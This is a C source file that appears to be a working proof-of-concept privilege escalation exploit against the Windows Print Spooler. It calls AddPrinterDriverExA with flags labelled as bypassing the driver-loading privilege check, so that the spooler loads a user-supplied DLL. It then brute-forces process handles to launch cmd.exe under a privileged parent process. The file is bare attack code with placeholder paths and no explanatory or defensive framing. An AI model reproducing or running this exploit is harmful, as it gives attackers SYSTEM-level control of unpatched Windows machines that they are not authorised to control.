#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winspool.h>

#define DLL_NAME "C:\\Test\\Dll.dll" //Change this
#define MAX_HANDLE 0xFFFF

typedef unsigned long long QWORD, *PQWORD, *LPQWORD, PTR, *PPTR;
/* Modern c++ way to GetProcAddress example:
auto NtImpersonateThread = (NTSYSAPI NTSTATUS (_stdcall*)(
	IN HANDLE               ThreadHandle,
	IN HANDLE               ThreadToImpersonate,
	IN PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService
	))GetProcAddress(GetModuleHandleA("ntdll"), "NtImpersonateThread");
*/

BOOL CreateProcessWithParentA(
	_In_ HANDLE hParentProcess,
	_In_opt_ LPCSTR lpApplicationName,
	_Inout_opt_ LPSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOA lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation)
{
	STARTUPINFOEXA startInfoex = {};
	CopyMemory(&startInfoex, lpStartupInfo, sizeof(STARTUPINFOA));
	startInfoex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	LPPROC_THREAD_ATTRIBUTE_LIST pPtal = 0x0;
	SIZE_T cbPtal = 0;
	InitializeProcThreadAttributeList(0x0, 1, 0, &cbPtal);
	pPtal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbPtal);
	InitializeProcThreadAttributeList(pPtal, 1, 0, &cbPtal);
	UpdateProcThreadAttribute(pPtal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess), 0x0, 0x0);
	startInfoex.lpAttributeList = pPtal;

	BOOL result = CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags | EXTENDED_STARTUPINFO_PRESENT, lpEnvironment, lpCurrentDirectory, &(startInfoex.StartupInfo), lpProcessInformation);
	
	DeleteProcThreadAttributeList(pPtal);
	return result;
}

int main(int argc, char *args[])
{
	DRIVER_INFO_2A di = {};
	di.cVersion = 3;
	di.pName = (LPSTR)"1111";
	di.pEnvironment = (LPSTR)"Windows x64";
	di.pDataFile = (LPSTR)DLL_NAME;
	di.pConfigFile = (LPSTR)DLL_NAME;
	di.pDriverPath = (LPSTR)"C:\\Test\\UNIDRV.DLL"; //Change this
	
	if (!AddPrinterDriverExA(0, 2, (PBYTE) & di, APD_COPY_ALL_FILES | 0x10 | 0x8000)) // Bypass check of SE_LOAD_DRIVER_NAME
	{
		printf("AddPrinterDriverExA error %d, printer name: a\n", GetLastError());
	}
	else
	{
		printf("AddPrinterDriverExA success, printer name: a\n");
	}

	STARTUPINFOA startInfo = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION procInfo = {};
	CHAR cmdLine[MAX_PATH];
	GetSystemDirectoryA(cmdLine, sizeof(cmdLine));
	strcat(cmdLine, "\\cmd.exe");

	for (HANDLE hProcess = 0; hProcess < (HANDLE)MAX_HANDLE; hProcess = (HANDLE)((PTR)hProcess + 4))
	{
		if (CreateProcessWithParentA(hProcess, 0, cmdLine, 0x0, 0x0, false, CREATE_NEW_CONSOLE, 0x0, 0x0, &startInfo, &procInfo))
		{
			printf("Created process with parent %p\n", hProcess);
			CloseHandle(procInfo.hProcess);
			CloseHandle(procInfo.hThread);
			//break;
		}
	}

	return 0;
}